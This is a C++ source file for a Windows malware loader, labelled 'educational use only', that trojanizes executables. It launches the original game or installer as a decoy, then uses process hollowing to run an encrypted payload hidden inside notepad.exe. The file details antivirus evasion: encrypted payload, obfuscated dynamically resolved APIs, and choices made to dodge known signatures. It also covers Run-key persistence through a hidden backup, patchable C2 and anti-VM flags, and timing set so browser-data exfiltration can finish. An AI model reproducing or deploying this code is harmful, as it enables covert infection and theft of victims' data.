// loader.cpp - process hollowing injector for any .exe the attacker chooses.
//
//   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
//
//   This is offensive security tooling for penetration testing, red-team exercises,
//   and security education. Only use on systems you own or are explicitly authorized
//   to test. Unauthorized use is illegal. The authors are not responsible for misuse.
//
//   loader.exe -p C:\tools\Host.exe [--kill] [--purge] [-t 60000]
//   -t wait N ms for payload to finish; --kill terminate host after; --purge delete file on reboot
//
//   Standalone mode (infected .exe): when loader.exe itself has a host appended
//   [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
//   it extracts the original host, launches it normally (installer/GUI appears),
//   and runs the payload silently via process hollowing -- no visible window.
//
//   AV EVASION (v4):
//   - Payload DLL is XOR-encrypted in payload.h. Decrypted at runtime before injection.
//     This prevents Defender from statically scanning the payload's imports/strings.
//   - Suspicious API calls (WriteProcessMemory, VirtualAllocEx, VirtualProtectEx,
//     CreateRemoteThread) are resolved dynamically via GetProcAddress, removing them
//     from the loader's IAT.
//   - Sacrificial process is notepad.exe (cmd.exe hollowing is a known signature).
//   - C2/persist/anti-VM sentinels are in the LOADER's .data section (plaintext, patchable
//     by auto.py). At runtime, the loader patches them into the decrypted payload buffer.
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600
#if defined(_WIN32) || defined(_WIN64)
    #if defined(__has_include)
        #if __has_include(<windows.h>)
            #include <windows.h>
        #elif __has_include(<Windows.h>)
            #include <Windows.h>
        #else
            #error "Windows SDK headers not found. Configure the Windows SDK / MinGW include path."
        #endif
    #else
        #include <windows.h>
    #endif
#else
    #error "This source requires a Windows target."
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "payload.h"                 // g_payload_enc[], g_xor_key[16], g_payload_len

// GUI subsystem: no console window when the victim double-clicks the infected exe
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wmainCRTStartup")

// ------------------------------------------------------------------ sentinels (loader's own copies)
// auto.py/pick.py find these in loader.exe and overwrite with real values.
// At runtime, DecryptPayload() copies these into the decrypted payload buffer.
static char g_c2_url[256]  = "CKC2_DEADBEEF_";               // C2 URL (14-byte sentinel)
static char g_persist[8]   = {'C','K','P','R','_','_','_','_'}; // persistence flag
static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip flag

// ------------------------------------------------------------------ dynamic API resolution
// These functions are NOT in the IAT — resolved at runtime to avoid heuristic detection.
// The API names are stored XOR-obfuscated and decoded onto the stack at runtime:
// a plaintext "WriteProcessMemory"/"CreateRemoteThread"/"NtUnmapViewOfSection"
// cluster in .rdata is a static injection signature even when resolved dynamically.
typedef BOOL   (WINAPI *tWriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef LPVOID (WINAPI *tVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *tVirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
typedef HANDLE (WINAPI *tCreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,
                                              LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef LONG   (WINAPI *tUnmap)(HANDLE,PVOID);
typedef LONG   (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);

template <size_t N> struct EncName {
    char d[N];
    constexpr EncName(const char (&s)[N]) : d{} {
        for(size_t i=0;i<N;i++) d[i]=(char)(s[i]^(char)(0x37+(i&0xF)));
    }
    void dec(char* out) const { for(size_t i=0;i<N;i++) out[i]=(char)(d[i]^(char)(0x37+(i&0xF))); }
};
template <size_t N> static FARPROC ProcObf(HMODULE m, const EncName<N>& e){
    char buf[40]; e.dec(buf);
    return GetProcAddress(m, buf);
}
static constexpr EncName EN_WPM  {"WriteProcessMemory"};
static constexpr EncName EN_VAE  {"VirtualAllocEx"};
static constexpr EncName EN_VPE  {"VirtualProtectEx"};
static constexpr EncName EN_CRT  {"CreateRemoteThread"};
static constexpr EncName EN_UNMAP{"NtUnmapViewOfSection"};
static constexpr EncName EN_NCTE {"NtCreateThreadEx"};

// ------------------------------------------------------------------ persistence (loader-side)
// Installs a registry Run key pointing at the hidden infected backup so the payload
// re-runs on every login. Done HERE and not in the payload: the hollowed process
// would register notepad.exe. The backup file is kept (normally it is deleted).
// Run value name is intentionally generic -- the old "WindowsDefenderHelper" was a
// known malware IOC string.
static void InstallRunKey(const wchar_t* exePath){
    HKEY hKey;
    long rc = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if(rc != 0) return;
    rc = RegSetValueExW(hKey, L"MicrosoftEdgeFontCache", 0, REG_SZ,
        (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}
// true when the CKPR sentinel in THIS binary was patched to CKPR0001 by auto.py
static bool PersistEnabled(void){
    return g_persist[4]=='0' && g_persist[5]=='0' && g_persist[6]=='0' && g_persist[7]=='1';
}

static PIMAGE_DOS_HEADER Mz(void* b){ return (PIMAGE_DOS_HEADER)b; }
static PIMAGE_NT_HEADERS Nt(void* b){
    PIMAGE_DOS_HEADER d=Mz(b); if(d->e_magic!=IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)b+d->e_lfanew);
    return n->Signature==IMAGE_NT_SIGNATURE ? n : NULL;
}
static bool IsClr(void* b){ PIMAGE_NT_HEADERS n=Nt(b); return n && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress!=0; }

// Convert RVA (relative virtual address) to raw file offset
static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(rva>=sec->VirtualAddress && rva<sec->VirtualAddress+sec->Misc.VirtualSize)
            return rva-sec->VirtualAddress+sec->PointerToRawData;
    }
    return rva;
}

// ------------------------------------------------------------------ payload decryption + sentinel patching
// Decrypts the XOR-encrypted payload, patches the C2/persist/anti-VM sentinels
// from the loader's own copies into the decrypted buffer, and returns it.
// Caller must free() the returned buffer.
static BYTE* DecryptPayload(void){
    BYTE* buf = (BYTE*)malloc(g_payload_len);
    if(!buf) return NULL;
    // XOR decrypt
    for(unsigned i=0; i<g_payload_len; i++)
        buf[i] = g_payload_enc[i] ^ g_xor_key[i & 15];

    // Patch C2 sentinel: search for "CKC2_DEADBEEF_" (14 bytes) in decrypted payload
    const char c2_sentinel[14] = {'C','K','C','2','_','D','E','A','D','B','E','E','F','_'};
    for(unsigned i=0; i+14 <= g_payload_len; i++){
        if(memcmp(buf+i, c2_sentinel, 14)==0){
            memcpy(buf+i, g_c2_url, 256);
            break;
        }
    }
    // Patch persistence sentinel: search for "CKPR____" (8 bytes)
    const char pr_sentinel[8] = {'C','K','P','R','_','_','_','_'};
    for(unsigned i=0; i+8 <= g_payload_len; i++){
        if(memcmp(buf+i, pr_sentinel, 8)==0){
            memcpy(buf+i, g_persist, 8);
            break;
        }
    }
    // Patch anti-VM sentinel: search for "CKAV0000" (8 bytes)
    const char av_sentinel[8] = {'C','K','A','V','0','0','0','0'};
    for(unsigned i=0; i+8 <= g_payload_len; i++){
        if(memcmp(buf+i, av_sentinel, 8)==0){
            memcpy(buf+i, g_skip_av, 8);
            break;
        }
    }
    return buf;
}

int wmain(int argc,wchar_t** argv){
    wchar_t* target=NULL; bool kill=false, purge=false; DWORD wait=5000;
    static wchar_t target_buf[MAX_PATH];               // buffer for standalone mode
    for(int i=1;i<argc;i++){
        if(!lstrcmpW(argv[i],L"-p")&&i+1<argc) target=argv[++i];
        else if(!lstrcmpW(argv[i],L"--kill")) kill=true;
        else if(!lstrcmpW(argv[i],L"--purge")) purge=true;
        else if(!lstrcmpW(argv[i],L"-t")&&i+1<argc) wait=(DWORD)_wtoi(argv[++i]);
    }

    // Standalone mode: if no -p target given, look for a host exe appended to this exe.
    // Format: [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
    // Flow: extract original host -> launch normally (game/installer appears) ->
    //       hollow a sacrificial notepad.exe with the payload -> payload runs hidden
    if(!target){
        wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
        HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hs!=INVALID_HANDLE_VALUE){
            LARGE_INTEGER fsize; GetFileSizeEx(hs,&fsize);
            bool found=false;
            if(fsize.QuadPart>12){
                LARGE_INTEGER pos; pos.QuadPart=fsize.QuadPart-8;
                SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                BYTE tail[8]; DWORD rd2=0; ReadFile(hs,tail,8,&rd2,NULL);
                if(rd2==8 && tail[4]=='C' && tail[5]=='K' && tail[6]=='L' && tail[7]=='G'){
                    DWORD host_len=*(DWORD*)tail;
                    if(host_len>0 && host_len<(DWORD)(fsize.QuadPart-8)){
                        // 1. Extract original host bytes
                        pos.QuadPart=fsize.QuadPart-8-host_len;
                        SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                        BYTE* hbuf=(BYTE*)VirtualAlloc(NULL,host_len,MEM_COMMIT,PAGE_READWRITE);
                        DWORD r3=0; ReadFile(hs,hbuf,host_len,&r3,NULL);
                        CloseHandle(hs); found=true;

                        // 2. Rename-restore: rename the infected .exe to a hidden temp,
                        //    and write the original host bytes back to the ORIGINAL filename.
                        //    Reason: Unity games derive their data path from the exe name
                        //    (they look for <name>_Data/). If we extract as ~ck_tmp.exe,
                        //    Unity looks for ~ck_tmp_Data/ and fails.
                        //    With rename-restore, the host runs with its original name
                        //    and finds <name>_Data/, UnityPlayer.dll, etc.

                        // Directory of the infected .exe
                        wchar_t wdir[MAX_PATH]; lstrcpyW(wdir,self);
                        wchar_t* s2=wdir+lstrlenW(wdir);
                        while(s2>wdir && s2[-1]!=L'\\') s2--;
                        *s2=0;

                        // Temp name to stash the infected exe: <dir>\~ck_bak.bin
                        // Hidden + System attributes so it doesn't show in Explorer
                        wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
                        lstrcatW(bak,L"~ck_bak.bin");
                        DeleteFileW(bak);

                        // Original .exe name (self) = where we write the clean host
                        wchar_t origName[MAX_PATH]; lstrcpyW(origName,self);

                        // Rename infected -> ~ck_bak.bin
                        BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);

                        // Hide ~ck_bak.bin immediately after rename
                        if(renamed){
                            SetFileAttributesW(bak, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        }

                        wchar_t runExe[MAX_PATH];
                        if(renamed){
                            // Write original host to the original filename
                            HANDLE horig=CreateFileW(origName,GENERIC_WRITE,0,NULL,
                                                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
                            if(horig!=INVALID_HANDLE_VALUE){
                                WriteFile(horig,hbuf,host_len,&r3,NULL); CloseHandle(horig);
                            }
                            lstrcpyW(runExe,origName);
                        } else {
                            // Fallback: extract as ~ck_tmp.exe
                            lstrcpyW(runExe,wdir); lstrcatW(runExe,L"~ck_tmp.exe");
                            HANDLE htmp=CreateFileW(runExe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
                                                    FILE_ATTRIBUTE_HIDDEN,NULL);
                            if(htmp!=INVALID_HANDLE_VALUE){
                                WriteFile(htmp,hbuf,host_len,&r3,NULL); CloseHandle(htmp);
                            }
                        }
                        VirtualFree(hbuf,0,MEM_RELEASE);

                        // 3. Launch original host normally (game/installer/GUI appears)
                        STARTUPINFOW si2={sizeof(si2)};
                        si2.dwFlags=STARTF_USESHOWWINDOW;
                        si2.wShowWindow=SW_SHOWNORMAL;
                        PROCESS_INFORMATION pi2; memset(&pi2,0,sizeof(pi2));
                        BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
                                       CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
                        if(!hp){
#ifdef DEBUG
                            // debug-only: never write a trace file on a production victim
                            CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
                            HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
                                GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
                            if(el!=INVALID_HANDLE_VALUE){
                                SetFilePointer(el,0,NULL,FILE_END);
                                char msg[300]; int n=wsprintfA(msg,
                                    "CreateProcessW host failed: err=%u path=%S\r\n",
                                    GetLastError(),runExe);
                                DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
                            }
#endif
                        }
                        if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }

                        // 3b. Clean up the temp file -- unless persistence is enabled:
                        // then register the hidden copy in Run and keep it as the
                        // payload carrier (the main exe is now the clean host)
                        bool persist_here = PersistEnabled();
                        if(renamed){
                            if(persist_here){
                                InstallRunKey(bak);          // keep the backup as payload carrier
                            } else if(!DeleteFileW(bak)){
                                MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                            }
                        } else {
                            if(persist_here){
                                InstallRunKey(runExe);
                            } else if(!DeleteFileW(runExe)){
                                MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                            }
                        }

                        // 4. Sacrificial process for hollowing: notepad.exe from System32
                        //    cmd.exe hollowing is a well-known Defender signature.
                        //    notepad.exe is less flagged and always present on Win10/11.
                        GetSystemDirectoryW(target_buf,MAX_PATH);
                        lstrcatW(target_buf,L"\\notepad.exe");
                        // Fallback: if notepad.exe doesn't exist (very unlikely), use cmd.exe
                        if(GetFileAttributesW(target_buf)==INVALID_FILE_ATTRIBUTES){
                            GetSystemDirectoryW(target_buf,MAX_PATH);
                            lstrcatW(target_buf,L"\\cmd.exe");
                        }
                        target=target_buf; kill=true;
                        wait=120000;   // hijack scan + 9 browsers + big dumps: 20s killed the payload mid-exfil
                        // falls through to hollowing code below
                    }
                }
            }
            if(!found) CloseHandle(hs);
        }
    }

    if(!target){
        return 1;
    }

    // 1. Host must be a native PE64 (no .NET / PyInstaller / 32-bit)
    HANDLE hf = CreateFileW(target,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){ return 2; }
    BYTE hdr[4096]; DWORD rd=0; ReadFile(hf,hdr,sizeof(hdr),&rd,NULL);
    PIMAGE_NT_HEADERS hn=Nt(hdr);
    if(!hn){ return 2; }
    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ return 2; }
    CloseHandle(hf);
    if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

    // 2. Decrypt the XOR-encrypted payload and patch sentinels
    BYTE* g_payload = DecryptPayload();
    if(!g_payload){ return 6; }

    // 3. Resolve suspicious APIs dynamically (removes them from IAT);
    //    names decoded from obfuscated constants so no plaintext lands in .rdata
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE nt  = GetModuleHandleA("ntdll.dll");
    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)ProcObf(k32, EN_WPM);
    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)ProcObf(k32, EN_VAE);
    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)ProcObf(k32, EN_VPE);
    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)ProcObf(k32, EN_CRT);
    tUnmap unmap=(tUnmap)ProcObf(nt, EN_UNMAP);
    tNCTE  ncte=(tNCTE)ProcObf(nt, EN_NCTE);
    if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
        free(g_payload); return 7;
    }

    // 4. Create sacrificial process in suspended state
    STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
        free(g_payload); return 3;
    }

    // 5. Unmap the host's original code (NtUnmapViewOfSection)
    PIMAGE_NT_HEADERS pn=Nt(g_payload);
    if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);

    // 6. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
    SIZE_T sz=pn->OptionalHeader.SizeOfImage;
    PVOID base=pVirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                              MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if(!base){ TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
    SIZE_T wr=0;
    pWriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        if(!sh->SizeOfRawData) continue;
        pWriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
                           g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
    }

    // 7. Fix IAT: only system DLLs, which have the SAME base in every process of this session
    DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if(imp_rva){
        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
        while(imp->Name){
            const char* dllname=(const char*)(g_payload+Rva2Off(pn,imp->Name));
            HMODULE m=LoadLibraryA(dllname); if(!m) break;
            DWORD th_rva=imp->FirstThunk;
            DWORD o_rva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(g_payload+Rva2Off(pn,o_rva));
            for(DWORD idx=0;o_local[idx].u1.AddressOfData;idx++){
                FARPROC a;
                if(IMAGE_SNAP_BY_ORDINAL(o_local[idx].u1.Ordinal))
                    a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(o_local[idx].u1.Ordinal));
                else{
                    DWORD hint_rva=(DWORD)o_local[idx].u1.AddressOfData;
                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(g_payload+Rva2Off(pn,hint_rva));
                    a=GetProcAddress(m,ib->Name);
                }
                ULONG_PTR v=(ULONG_PTR)a;
                PVOID remote_thunk=(BYTE*)base+th_rva+idx*sizeof(IMAGE_THUNK_DATA);
                pWriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
            }
            imp++;
        }
    }

    // 8. Set per-section memory protection (no global RWX) and create hidden thread
    sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        DWORD p=PAGE_READONLY,f=sh->Characteristics;
        if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
        else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
        pVirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
    }
    HANDLE th=NULL;
    ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
    BOOL spawned=FALSE;
    if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
                            (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
                            (PVOID)arg,NULL,0x1/*HIDE_FROM_DEBUGGER*/,0,0,NULL) >= 0;
    if(!spawned && pCreateRemoteThread){
        th=pCreateRemoteThread(pi.hProcess,NULL,0,
            (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
            (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
    }
    if(!spawned){ TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }

    // 9. Payload does its work on the remote thread.
    //    DO NOT resume the main thread -- the original entry point was unmapped
    //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
    //    entire process (and the payload with it). The remote thread runs on its own.
    WaitForSingleObject(th,wait);
    if(kill) TerminateProcess(pi.hProcess,0);
    CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    free(g_payload);
    return 0;
}
